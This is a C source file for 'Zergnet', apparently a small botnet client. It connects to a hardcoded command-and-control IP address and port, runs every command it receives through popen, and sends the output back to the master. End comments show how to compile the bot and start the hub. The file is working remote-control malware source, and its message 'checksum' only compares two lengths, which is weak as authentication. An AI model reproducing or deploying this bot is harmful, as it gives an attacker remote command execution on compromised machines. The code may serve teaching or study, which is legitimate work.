/*
 * This file is part of Zergnet.
 * Copyright (c) Freddy Iniguez & Carlos Naal 2016
 *
 * Zergnet is free software: you can redistribute
 * it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3
 * of the License, or (at your option) any later version.
 *
 * Zergnet is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Zergnet.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "zergnet.h"

// Zergnet IP address and port:
#define CC_SERVER "104.236.224.88"
#define CC_PORT 9999
#define MAX_BUF 1024

// Zergnet checksum assessment variables
int encrypted_length = 0;
int decrypted_length = 0;

#define PEXIT(str) {perror (str);exit(1);}

// ======================= VARIABLES =======================

// Variable used as Bot identifier
static char *bot_id = NULL;


// ======================= METHODS =======================

// ===== BOT "bot_print" =====
// Method to print in the bot console
int bot_print (int s, char *str){
  return write (s, str, strlen(str));
}


// ===== BOT "bot_read" =====
// Method to catch the instruction written by the master
int bot_read (int s, char *msg){
  memset (msg, 0, MAX_BUF);
  if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");
  // -------- WARNING: ENCRYPTH AND SIGN THE MESSAGE HERE --------
  encrypted_length = encryption_with_public_key(msg);
  return 0;
}


// ===== BOT "bot_run_cmd" =====
// Method to execute the command; prints in the console of master the result
int bot_run_cmd (int s, char *cmd){
  char  line[1024];
  FILE *f = popen (cmd,"r");

  if (!f) return -1;
  while (!feof (f)){
      if (!fgets (line, 1024, f)) break;
      bot_print (s, ">>>");
      bot_print (s, bot_id);
      bot_print (s, ": ");
      bot_print (s, line);
  }
  fclose(f);

  return 0;
}


// ===== BOT "bot_parse" =====
// Method to extract the target and command
int bot_parse (int s, char *msg){
  char *target = msg;
  char *cmd = NULL;

  if ((cmd = strchr (msg, ':')) == NULL){
      printf ("!! Malformed command. Should be TARGET:command\n");
      return -1;
  }

  *cmd = 0;
  cmd++;
  cmd[strlen(cmd) - 1] = 0;

  if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
    return 0; // Silently ignore messages not for us
    
  // -------- WARNING: DECRYPTH AND SIGN THE MESSAGE HERE --------
  decrypted_length = decryption_with_private_key(msg);
  if (encrypted_length == decrypted_length){
	  printf ("+ Executing command: '%s'\n", cmd);
      bot_run_cmd (s, cmd);
      return 0;
  }else{
	  printf ("This command cannot be performed. Checksum failed.\n");
	  return 1;
  }
}


// ===== BOT "bot_connect_cc" =====
// Method to connect to the master
int bot_connect_cc (char *ip, int port){
  char                 msg[1024];
  struct sockaddr_in   server;
  int                  s;
  
  server.sin_addr.s_addr = inet_addr(ip);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);

  if ((s = socket (PF_INET, SOCK_STREAM, 0)) < 0) 
    PEXIT ("socket:");
  if ((connect (s, (struct sockaddr*) &server, sizeof(server))) < 0) 
    PEXIT ("conect:");
  snprintf (msg, 1024, ">>>%s: This is '%s' Up and Running\n", bot_id, bot_id);
  bot_print (s, msg);

  return s;
}



// ===== BOT "main" =====
// Main Method. An infinitive loop is created to read and execute commands
int main (int argc, char* argv[]){
  char  msg[MAX_BUF]; 
  int   cc_s;

  if (argc !=2) PEXIT ("Invalid Number Of Arguments:");
  bot_id = strdup (argv[1]);
 
  printf ("'%s' joining the Zergnet\n", bot_id);
  cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
  while (1){
      bot_read (cc_s, msg);
      bot_parse (cc_s, msg);
  }
}

// ===== BOT "End notes" =====
// >>> To run the master:
// nk -hub -s T,9999

// >>> To run the bots (with the RSA method):
// gcc -o bot bot.c zergnet.c -L/usr/lib -lssl -lcrypto
// ./bot BotName
